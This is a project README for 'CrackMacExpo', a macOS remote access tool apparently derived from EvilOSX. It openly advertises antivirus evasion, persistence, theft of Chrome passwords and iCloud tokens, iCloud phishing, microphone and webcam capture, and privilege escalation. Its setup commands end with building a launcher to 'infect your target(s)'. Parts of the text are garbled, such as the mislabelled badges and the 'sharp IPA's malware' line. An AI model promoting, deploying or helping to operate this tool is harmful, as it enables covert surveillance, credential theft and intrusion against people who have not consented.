# CrackMacExpo

GUI frontend and CLI, for **macOS** or **OSX** distro Remote Access Tool. Penetrate the SSL and Security of OSX distro with a sharp IPA's malware, specialized for Apple.

```python
         __             _,-"~^"-.
       _// )      _,-"~`         `.
     ." ( /`"-,-"`                 ;
    / 6                             ;    'MacOS & OSX'
   /           ,             ,-"     ;  Distro Execution
  (,__.--.      \           /        ;
   //'   /`-.\   |          |        `.______________.
     _.-'_/`  )  )--...,,,___\     \-`----""""~~~~^^/
   ((("~` _.-'.-'           __`-.   )        
         ((("`             (((---~"`      
```

---

<p align="center">
  <a href="https://github.com/Marten4n6/EvilOSX/blob/master/LICENSE.txt">
      <img src="https://img.shields.io/badge/license-GPLv3-red.svg?style=flat-square" alt="License">
  </a>
  <a href="https://github.com/Marten4n6/EvilOSX/blob/master/LICENSE.txt">
      <img src="https://img.shields.io/badge/C-red.svg?style=flat-square" alt="Python">
  </a>
  <a href="https://github.com/Marten4n6/EvilOSX/blob/master/LICENSE.txt">
      <img src="https://img.shields.io/badge/Python3-blue.svg?style=flat-square" alt="Python">
  </a>
  <a href="https://github.com/Marten4n6/EvilOSX/issues">
    <img src="https://img.shields.io/github/issues/Marten4n6/EvilOSX.svg?style=flat-square" alt="Issues">
  </a>
  <a href="https://github.com/Marten4n6/EvilOSX/blob/master/CONTRIBUTING.md">
      <img src="https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat-square" alt="Contributing">
  </a>
</p>

# Features
- Emulate a terminal instance
- Simple extendable [Module](https://github.com/Marten4n6/EvilOSX/blob/master/CONTRIBUTING.md) system
- Undetected by Anti Virus ( OpenSSL [AES-256](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) encrypted payloads )
- Persistent
- GUI and CLI support
- Retrieve Chrome passwords
- Retrieve iCloud tokens and contacts
- Monitor the clipboard
- Retrieve browser history (Chrome and Safari)
- [Phish](https://i.imgur.com/x3ilHQi.png) for iCloud passwords via iTunes
- iTunes ( iOS ) backup enumeration
- Record the microphone
- Take a desktop screenshot or picture using the webcam
- Attempt to get root via local privilege escalation

## How To Use

```bash
# Clone or download this repository
$ git clone https://github.com/pxcs/CrackMacExpo

# Go into the repository
$ cd CrackMacExpo

# Install dependencies required by the server
$ sudo pip install -r requirements.txt

# Start the GUI
$ python crackmacexpo.py

# Lastly, run a built launcher on your target(s)
```

**Warning:** Because payloads are created unique to the target system (automatically by the server), the server must be running when any bot connects for the first time.

### Advanced users

There's also a CLI for those who want to use this over SSH:
```bash
# Create a launcher to infect your target(s)
$ python crackmacexpo.py --builder

# Start the CLI
$ python crackmacexpo.py --cli --port 443

# Lastly, run a built launcher on your target(s)
```

## Screenshots

![CLI](https://i.imgur.com/DGYCQMl.png)

## Issues
Feel free to submit any issues or feature requests [here](https://github.com/pxcs/CrackMacExpo/issues).

## Contribution
For a simple guide on how to create modules click [here](https://github.com/pxcs/CrackMacExpo).

# Credits
- The awesome [Empire](https://github.com/EmpireProject) project
- Shoutout to [Patrick Wardle](https://twitter.com/patrickwardle) for his awesome talks, check out [Objective-See](https://objective-see.com/)
- manwhoami for his projects: OSXChromeDecrypt, MMeTokenDecrypt, iCloudContacts
- The slowloris module is pretty much copied from [PySlowLoris](https://github.com/ProjectMayhem/PySlowLoris)
- [urwid](http://urwid.org/) and [this code](https://github.com/izderadicka/xmpp-tester/blob/master/commander.py) which saved me a lot of time with the CLI
- Logo created by [motusora](https://www.behance.net/motusora)
- Repo [Marten4n6](https://github.com/Marten4n6/EvilOSX/)
